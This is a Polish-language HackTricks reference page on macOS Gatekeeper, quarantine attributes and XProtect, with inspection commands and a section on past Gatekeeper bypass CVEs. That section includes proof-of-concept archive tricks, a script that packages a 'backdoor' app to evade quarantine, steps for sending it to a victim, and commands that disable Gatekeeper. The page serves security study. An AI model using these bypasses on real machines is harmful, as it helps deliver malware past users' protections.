# macOS Gatekeeper / Quarantine / XProtect

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper** to funkcja zabezpieczeń opracowana dla systemów operacyjnych Mac, zaprojektowana w celu zapewnienia, że użytkownicy **uruchamiają tylko zaufane oprogramowanie** na swoich systemach. Działa poprzez **weryfikację oprogramowania**, które użytkownik pobiera i próbuje otworzyć z **źródeł spoza App Store**, takich jak aplikacja, wtyczka lub pakiet instalacyjny.

Kluczowym mechanizmem Gatekeepera jest jego **proces weryfikacji**. Sprawdza, czy pobrane oprogramowanie jest **podpisane przez uznanego dewelopera**, co zapewnia autentyczność oprogramowania. Ponadto ustala, czy oprogramowanie jest **notaryzowane przez Apple**, co potwierdza, że nie zawiera znanej złośliwej zawartości i nie zostało zmienione po notaryzacji.

Dodatkowo, Gatekeeper wzmacnia kontrolę i bezpieczeństwo użytkownika, **prosząc użytkowników o zatwierdzenie otwarcia** pobranego oprogramowania po raz pierwszy. To zabezpieczenie pomaga zapobiegać przypadkowemu uruchomieniu przez użytkowników potencjalnie szkodliwego kodu wykonywalnego, który mogli pomylić z nieszkodliwym plikiem danych.

### Podpisy aplikacji

Podpisy aplikacji, znane również jako podpisy kodu, są kluczowym elementem infrastruktury zabezpieczeń Apple. Służą do **weryfikacji tożsamości autora oprogramowania** (dewelopera) oraz do zapewnienia, że kod nie został zmieniony od momentu ostatniego podpisania.

Oto jak to działa:

1. **Podpisywanie aplikacji:** Gdy deweloper jest gotowy do dystrybucji swojej aplikacji, **podpisuje aplikację za pomocą klucza prywatnego**. Ten klucz prywatny jest powiązany z **certyfikatem, który Apple wydaje deweloperowi** po zapisaniu się do programu Apple Developer. Proces podpisywania polega na stworzeniu kryptograficznego skrótu wszystkich części aplikacji i zaszyfrowaniu tego skrótu kluczem prywatnym dewelopera.
2. **Dystrybucja aplikacji:** Podpisana aplikacja jest następnie dystrybuowana do użytkowników wraz z certyfikatem dewelopera, który zawiera odpowiadający klucz publiczny.
3. **Weryfikacja aplikacji:** Gdy użytkownik pobiera i próbuje uruchomić aplikację, system operacyjny Mac używa klucza publicznego z certyfikatu dewelopera do odszyfrowania skrótu. Następnie ponownie oblicza skrót na podstawie aktualnego stanu aplikacji i porównuje go z odszyfrowanym skrótem. Jeśli się zgadzają, oznacza to, że **aplikacja nie została zmodyfikowana** od momentu jej podpisania przez dewelopera, a system zezwala na jej uruchomienie.

Podpisy aplikacji są istotną częścią technologii Gatekeeper Apple. Gdy użytkownik próbuje **otworzyć aplikację pobraną z internetu**, Gatekeeper weryfikuje podpis aplikacji. Jeśli jest podpisana certyfikatem wydanym przez Apple dla znanego dewelopera i kod nie został zmieniony, Gatekeeper zezwala na uruchomienie aplikacji. W przeciwnym razie blokuje aplikację i informuje użytkownika.

Począwszy od macOS Catalina, **Gatekeeper sprawdza również, czy aplikacja została notaryzowana** przez Apple, co dodaje dodatkową warstwę zabezpieczeń. Proces notaryzacji sprawdza aplikację pod kątem znanych problemów z bezpieczeństwem i złośliwego kodu, a jeśli te kontrole przejdą, Apple dodaje do aplikacji bilet, który Gatekeeper może zweryfikować.

#### Sprawdź podpisy

Podczas sprawdzania niektórych **przykładów złośliwego oprogramowania** zawsze powinieneś **sprawdzić podpis** binarnego pliku, ponieważ **deweloper**, który go podpisał, może być już **powiązany** ze **złośliwym oprogramowaniem.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

Proces notaryzacji Apple'a służy jako dodatkowe zabezpieczenie chroniące użytkowników przed potencjalnie szkodliwym oprogramowaniem. Polega on na **przesłaniu aplikacji przez dewelopera do zbadania** przez **Usługę Notaryzacyjną Apple'a**, której nie należy mylić z Przeglądem Aplikacji. Usługa ta jest **automatycznym systemem**, który analizuje przesłane oprogramowanie pod kątem obecności **złośliwej zawartości** oraz wszelkich potencjalnych problemów z podpisywaniem kodu.

Jeśli oprogramowanie **przejdzie** tę inspekcję bez budzenia jakichkolwiek wątpliwości, Usługa Notaryzacyjna generuje bilet notaryzacyjny. Deweloper jest następnie zobowiązany do **dołączenia tego biletu do swojego oprogramowania**, co nazywa się 'staplingiem.' Ponadto, bilet notaryzacyjny jest również publikowany online, gdzie Gatekeeper, technologia zabezpieczeń Apple'a, może go uzyskać.

Przy pierwszej instalacji lub uruchomieniu oprogramowania przez użytkownika, istnienie biletu notaryzacyjnego - czy to dołączonego do pliku wykonywalnego, czy znalezionego online - **informuje Gatekeeper, że oprogramowanie zostało notaryzowane przez Apple'a**. W rezultacie, Gatekeeper wyświetla opisową wiadomość w początkowym oknie dialogowym uruchamiania, wskazując, że oprogramowanie przeszło kontrole pod kątem złośliwej zawartości przez Apple'a. Proces ten zwiększa zaufanie użytkowników do bezpieczeństwa oprogramowania, które instalują lub uruchamiają na swoich systemach.

### Enumerating GateKeeper

GateKeeper to zarówno **kilka komponentów zabezpieczeń**, które zapobiegają uruchamianiu nieufnych aplikacji, jak i **jeden z komponentów**.

Możliwe jest sprawdzenie **statusu** GateKeepera za pomocą:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Zauważ, że kontrole podpisów GateKeepera są wykonywane tylko dla **plików z atrybutem Quarantine**, a nie dla każdego pliku.
{% endhint %}

GateKeeper sprawdzi, czy zgodnie z **preferencjami i podpisem** binarka może być wykonana:

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

Baza danych, która przechowuje tę konfigurację, znajduje się w **`/var/db/SystemPolicy`**. Możesz sprawdzić tę bazę danych jako root za pomocą:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Zauważ, że pierwsza zasada kończy się na "**App Store**", a druga na "**Developer ID**" i że w poprzednim obrazie było **włączone wykonywanie aplikacji z App Store i zidentyfikowanych deweloperów**.\
Jeśli **zmienisz** to ustawienie na App Store, zasady "**Notarized Developer ID** znikną**.

Istnieje również tysiące zasad **typu GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
To są hashe, które pochodzą z **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** i **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Lub możesz wymienić poprzednie informacje za pomocą:
```bash
sudo spctl --list
```
Opcje **`--master-disable`** i **`--global-disable`** narzędzia **`spctl`** całkowicie **wyłączą** te kontrole podpisów:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Kiedy jest całkowicie włączona, pojawi się nowa opcja:

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

Można **sprawdzić, czy aplikacja będzie dozwolona przez GateKeeper** za pomocą:
```bash
spctl --assess -v /Applications/App.app
```
Możliwe jest dodanie nowych reguł w GateKeeper, aby zezwolić na uruchamianie określonych aplikacji za pomocą:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Quarantine Files

Po **pobraniu** aplikacji lub pliku, konkretne aplikacje macOS, takie jak przeglądarki internetowe lub klienci poczty e-mail, **przypisują rozszerzony atrybut pliku**, powszechnie znany jako "**flaga kwarantanny**," do pobranego pliku. Atrybut ten działa jako środek bezpieczeństwa, aby **oznaczyć plik** jako pochodzący z nieznanego źródła (internetu) i potencjalnie niosący ryzyko. Jednak nie wszystkie aplikacje przypisują ten atrybut, na przykład, powszechne oprogramowanie klientów BitTorrent zazwyczaj omija ten proces.

**Obecność flagi kwarantanny sygnalizuje funkcję zabezpieczeń Gatekeeper w macOS, gdy użytkownik próbuje wykonać plik**.

W przypadku, gdy **flaga kwarantanny nie jest obecna** (jak w przypadku plików pobranych za pomocą niektórych klientów BitTorrent), **sprawdzenia Gatekeepera mogą nie być przeprowadzane**. Dlatego użytkownicy powinni zachować ostrożność przy otwieraniu plików pobranych z mniej bezpiecznych lub nieznanych źródeł.

{% hint style="info" %}
**Sprawdzanie** **ważności** podpisów kodu jest **zasobożernym** procesem, który obejmuje generowanie kryptograficznych **hashy** kodu i wszystkich jego powiązanych zasobów. Ponadto, sprawdzanie ważności certyfikatu wiąże się z przeprowadzeniem **sprawdzenia online** na serwerach Apple, aby zobaczyć, czy został on unieważniony po jego wydaniu. Z tych powodów, pełne sprawdzenie podpisu kodu i notaryzacji jest **niepraktyczne do przeprowadzenia za każdym razem, gdy aplikacja jest uruchamiana**.

Dlatego te kontrole są **przeprowadzane tylko podczas uruchamiania aplikacji z atrybutem kwarantanny.**
{% endhint %}

{% hint style="warning" %}
Ten atrybut musi być **ustawiony przez aplikację tworzącą/pobierającą** plik.

Jednak pliki, które są w piaskownicy, będą miały ten atrybut ustawiony dla każdego pliku, który tworzą. A aplikacje, które nie są w piaskownicy, mogą ustawić go same lub określić klucz [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) w **Info.plist**, co spowoduje, że system ustawi rozszerzony atrybut `com.apple.quarantine` na tworzonych plikach,
{% endhint %}

Ponadto, wszystkie pliki utworzone przez proces wywołujący **`qtn_proc_apply_to_self`** są kwarantannowane. Lub API **`qtn_file_apply_to_path`** dodaje atrybut kwarantanny do określonej ścieżki pliku.

Możliwe jest **sprawdzenie jego statusu i włączenie/wyłączenie** (wymagane uprawnienia roota) za pomocą:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Możesz również **sprawdzić, czy plik ma rozszerzony atrybut kwarantanny** za pomocą:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Sprawdź **wartość** **rozszerzonych** **atrybutów** i znajdź aplikację, która zapisała atrybut kwarantanny za pomocą:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Właściwie proces "może ustawić flagi kwarantanny dla plików, które tworzy" (próbowałem zastosować flagę USER_APPROVED w utworzonym pliku, ale nie udało się jej zastosować):

<details>

<summary>Źródło kodu stosującego flagi kwarantanny</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

I **usuń** ten atrybut za pomocą:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
I znajdź wszystkie zainfekowane pliki za pomocą:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Informacje o kwarantannie są również przechowywane w centralnej bazie danych zarządzanej przez LaunchServices w **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

Rozszerzenie jądra jest dostępne tylko przez **cache jądra w systemie**; jednak możesz pobrać **Kernel Debug Kit z https://developer.apple.com/**, który będzie zawierał wersję z symbolami rozszerzenia.

### XProtect

XProtect to wbudowana funkcja **antywirusowa** w macOS. XProtect **sprawdza każdą aplikację przy pierwszym uruchomieniu lub modyfikacji w porównaniu do swojej bazy danych** znanych złośliwych oprogramowań i niebezpiecznych typów plików. Gdy pobierasz plik przez niektóre aplikacje, takie jak Safari, Mail lub Wiadomości, XProtect automatycznie skanuje plik. Jeśli pasuje do jakiegokolwiek znanego złośliwego oprogramowania w swojej bazie danych, XProtect **zapobiegnie uruchomieniu pliku** i powiadomi cię o zagrożeniu.

Baza danych XProtect jest **regularnie aktualizowana** przez Apple o nowe definicje złośliwego oprogramowania, a te aktualizacje są automatycznie pobierane i instalowane na twoim Macu. Zapewnia to, że XProtect jest zawsze aktualny z najnowszymi znanymi zagrożeniami.

Warto jednak zauważyć, że **XProtect nie jest pełnoprawnym rozwiązaniem antywirusowym**. Sprawdza tylko określoną listę znanych zagrożeń i nie wykonuje skanowania w czasie rzeczywistym, jak większość oprogramowania antywirusowego.

Możesz uzyskać informacje o najnowszej aktualizacji XProtect, uruchamiając:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect znajduje się w chronionej lokalizacji SIP pod **/Library/Apple/System/Library/CoreServices/XProtect.bundle**, a wewnątrz pakietu można znaleźć informacje, które XProtect wykorzystuje:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Pozwala kodowi z tymi cdhashami używać starych uprawnień.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Lista wtyczek i rozszerzeń, które są zabronione do załadowania za pomocą BundleID i TeamID lub wskazują minimalną wersję.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Reguły Yara do wykrywania złośliwego oprogramowania.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Baza danych SQLite3 z hashami zablokowanych aplikacji i TeamIDs.

Zauważ, że istnieje inna aplikacja w **`/Library/Apple/System/Library/CoreServices/XProtect.app`**, związana z XProtect, która nie jest zaangażowana w proces Gatekeepera.

### Nie Gatekeeper

{% hint style="danger" %}
Zauważ, że Gatekeeper **nie jest uruchamiany za każdym razem**, gdy uruchamiasz aplikację, tylko _**AppleMobileFileIntegrity**_ (AMFI) **weryfikuje podpisy kodu wykonywalnego** tylko wtedy, gdy uruchamiasz aplikację, która została już uruchomiona i zweryfikowana przez Gatekeepera.
{% endhint %}

Dlatego wcześniej możliwe było uruchomienie aplikacji, aby zbuforować ją w Gatekeeperze, a następnie **zmodyfikowanie nie wykonywalnych plików aplikacji** (jak pliki Electron asar lub NIB) i jeśli nie było innych zabezpieczeń, aplikacja była **uruchamiana** z **złośliwymi** dodatkami.

Jednak teraz to nie jest możliwe, ponieważ macOS **zapobiega modyfikacji plików** wewnątrz pakietów aplikacji. Więc, jeśli spróbujesz ataku [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), odkryjesz, że nie jest już możliwe jego nadużycie, ponieważ po uruchomieniu aplikacji, aby zbuforować ją w Gatekeeperze, nie będziesz w stanie zmodyfikować pakietu. A jeśli zmienisz na przykład nazwę katalogu Contents na NotCon (jak wskazano w exploicie), a następnie uruchomisz główny plik binarny aplikacji, aby zbuforować ją w Gatekeeperze, spowoduje to błąd i nie zostanie uruchomiona.

## Obejścia Gatekeepera

Każdy sposób na obejście Gatekeepera (udać się zmusić użytkownika do pobrania czegoś i uruchomienia tego, gdy Gatekeeper powinien to zablokować) jest uważany za lukę w macOS. Oto niektóre CVE przypisane do technik, które pozwalały na obejście Gatekeepera w przeszłości:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Zaobserwowano, że jeśli **Narzędzie Archiwizacji** jest używane do ekstrakcji, pliki z **ścieżkami przekraczającymi 886 znaków** nie otrzymują rozszerzonego atrybutu com.apple.quarantine. Ta sytuacja niezamierzenie pozwala tym plikom **ominąć kontrole bezpieczeństwa Gatekeepera**.

Sprawdź [**oryginalny raport**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) po więcej informacji.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Gdy aplikacja jest tworzona za pomocą **Automatora**, informacje o tym, co potrzebuje do wykonania, znajdują się w `application.app/Contents/document.wflow`, a nie w pliku wykonywalnym. Plik wykonywalny to tylko ogólny binarny plik Automatora zwany **Automator Application Stub**.

Dlatego możesz sprawić, że `application.app/Contents/MacOS/Automator\ Application\ Stub` **wskazuje za pomocą linku symbolicznego na inny Automator Application Stub w systemie** i wykona to, co znajduje się w `document.wflow` (twój skrypt) **bez wywoływania Gatekeepera**, ponieważ rzeczywisty plik wykonywalny nie ma atrybutu kwarantanny.

Przykładowa oczekiwana lokalizacja: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Sprawdź [**oryginalny raport**](https://ronmasas.com/posts/bypass-macos-gatekeeper) po więcej informacji.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

W tym obejściu stworzono plik zip z aplikacją, która zaczynała kompresję z `application.app/Contents` zamiast `application.app`. Dlatego **atrybut kwarantanny** został zastosowany do wszystkich **plików z `application.app/Contents`**, ale **nie do `application.app`**, co było sprawdzane przez Gatekeepera, więc Gatekeeper został ominięty, ponieważ gdy `application.app` został uruchomiony, **nie miał atrybutu kwarantanny.**
```bash
zip -r test.app/Contents test.zip
```
Sprawdź [**oryginalny raport**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) po więcej informacji.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Nawet jeśli komponenty są różne, wykorzystanie tej podatności jest bardzo podobne do poprzedniej. W tym przypadku wygenerujemy Archiwum Apple z **`application.app/Contents`**, więc **`application.app` nie otrzyma atrybutu kwarantanny** podczas dekompresji przez **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Sprawdź [**oryginalny raport**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) po więcej informacji.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** może być użyty do zapobiegania komukolwiek w pisaniu atrybutu w pliku:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Ponadto, format pliku **AppleDouble** kopiuje plik wraz z jego ACE.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana w xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w dekompresowanym pliku. Więc, jeśli skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, który uniemożliwia zapisanie innych xattr... xattr kwarantanny nie został ustawiony w aplikacji:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.

Zauważ, że to może być również wykorzystane z AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Odkryto, że **Google Chrome nie ustawia atrybutu kwarantanny** dla pobranych plików z powodu pewnych wewnętrznych problemów macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Formaty plików AppleDouble przechowują atrybuty pliku w osobnym pliku zaczynającym się od `._`, co pomaga w kopiowaniu atrybutów plików **między maszynami macOS**. Jednak zauważono, że po dekompresji pliku AppleDouble, plik zaczynający się od `._` **nie otrzymał atrybutu kwarantanny**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Mając możliwość stworzenia pliku, który nie będzie miał ustawionego atrybutu kwarantanny, **możliwe było ominięcie Gatekeepera.** Sztuczka polegała na **stworzeniu aplikacji pliku DMG** przy użyciu konwencji nazewnictwa AppleDouble (zaczynając od `._`) i stworzeniu **widocznego pliku jako dowiązania symbolicznego do tego ukrytego** pliku bez atrybutu kwarantanny.\
Gdy **plik dmg jest wykonywany**, ponieważ nie ma atrybutu kwarantanny, **ominięty zostanie Gatekeeper.**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (z tej [prezentacji](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

* Utwórz katalog zawierający aplikację.
* Dodaj uchg do aplikacji.
* Skonpresuj aplikację do pliku tar.gz.
* Wyślij plik tar.gz do ofiary.
* Ofiara otwiera plik tar.gz i uruchamia aplikację.
* Gatekeeper nie sprawdza aplikacji.

### Zapobiegaj atrybutowi kwarantanny xattr

W pakiecie ".app", jeśli atrybut kwarantanny xattr nie jest do niego dodany, podczas wykonywania **Gatekeeper nie zostanie uruchomiony**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
